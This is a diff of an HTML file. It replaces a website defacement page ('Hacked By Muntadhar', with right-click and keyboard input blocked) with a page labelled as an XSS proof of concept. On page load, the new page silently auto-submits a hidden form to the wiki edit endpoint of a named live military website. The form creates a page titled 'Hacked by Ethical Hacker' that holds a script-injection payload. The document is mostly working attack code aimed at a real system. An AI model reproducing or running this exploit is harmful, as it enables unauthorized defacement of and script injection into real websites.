@@ -3,82 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked By Muntadharma</title>
-    <meta name="description" content="Hacked by Muntadhar">
-    <meta name="keywords" content="hacked,deface,cyber,security,penetration">
-    <meta name="robots" content="index, follow">
-    <style>
-        body {
-            cursor: url("https://cur.cursors-4u.net/symbols/sym46.cur"), auto;
-            background-color: black;
-            color: white;
-            text-align: center;
-            font-family: Courier, monospace;
-        }
-        #background-video {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            object-fit: cover;
-            z-index: -1;
-        }
-        h1, p, red, .footer {
-            animation: glitch 1.5s infinite;
-        }
-        h1 {
-            font-size: 3em;
-            color: #ff0000;
-        }
-        p, small {
-            font-size: 1.5em;
-            color: #0ff;
-        }
-        .footer {
-            font-size: 1em;
-            margin-top: 20px;
-        }
-        /* Glitch Effect */
-        @keyframes glitch {
-            0% { text-shadow: 2px 2px red; }
-            20% { text-shadow: -2px -2px blue; }
-            40% { text-shadow: 2px -2px green; }
-            60% { text-shadow: -2px 2px yellow; }
-            80% { text-shadow: 1px -1px purple; }
-            100% { text-shadow: -1px 1px cyan; }
-        }
-        /* Flicker effect for "Stay vigilant" */
-        small {
-            color: #ff3333;
-            animation: flicker 2s infinite;
-        }
-        @keyframes flicker {
-            0%, 18%, 22%, 25%, 53%, 57%, 100% {
-                opacity: 1;
-            }
-            20%, 24%, 55% {
-                opacity: 0;
-            }
-        }
-    </style>
+    <title>XSS PoC - Auto POST</title>
 </head>
-<body oncontextmenu="return false;" onkeydown="return false;" onclick="fs()">
-    <video id="background-video" src="https://videos.pexels.com/video-files/5435326/5435326-uhd_2732_1440_25fps.mp4" autoplay loop muted></video>
-    <h1>Hacked By Muntadhar</h1>
-    <p>Your system has been compromised</p>
-    <red><i>Muntadhar - Iraq</i></red>
-    <br>Stay vigilant.
-    <br>
-    <small>Reflect on your security!</small>
-    <div class="footer">
-        <marquee><b>In Security I Believe, In Hackers I Fear</b></marquee>
-    </div>
+<body>
+    <h1>Proof of Concept - XSS Exploit</h1>
+    <p>If this was a real attack, the request would have been sent automatically.</p>
+
     <script>
-        function fs() {
-            var elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
+        // Create a hidden form to auto-submit the malicious request
+        var form = document.createElement("form");
+        form.method = "POST";
+        form.action = "https://mipb.army.mil/web/guest/training?p_p_id=36&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-2&p_p_col_count=1&_36_struts_action=%2Fwiki%2Fedit_page";
+        
+        // Add necessary POST data
+        var params = {
+            "_36_formDate": "1742332840352",
+            "_36_cmd": "",
+            "_36_redirect": "https://mipb.army.mil/web/guest/training",
+            "_36_nodeId": "10562",
+            "_36_newPage": "true",
+            "_36_editTitle": "true",
+            "_36_title": "Hacked by Ethical Hacker",
+            "_36_format": "html",
+            "_36_content": "<script>alert('XSS Vulnerability Exploited!');</script>",
+            "_36_summary": "",
+            "_36_workflowAction": "2",
+            "_36_preview": "true"
+        };
+
+        for (var key in params) {
+            if (params.hasOwnProperty(key)) {
+                var hiddenField = document.createElement("input");
+                hiddenField.type = "hidden";
+                hiddenField.name = key;
+                hiddenField.value = params[key];
+                form.appendChild(hiddenField);
+            }
         }
+
+        document.body.appendChild(form);
+        form.submit(); // Auto-submit the form when the page loads
     </script>
 </body>
 </html>
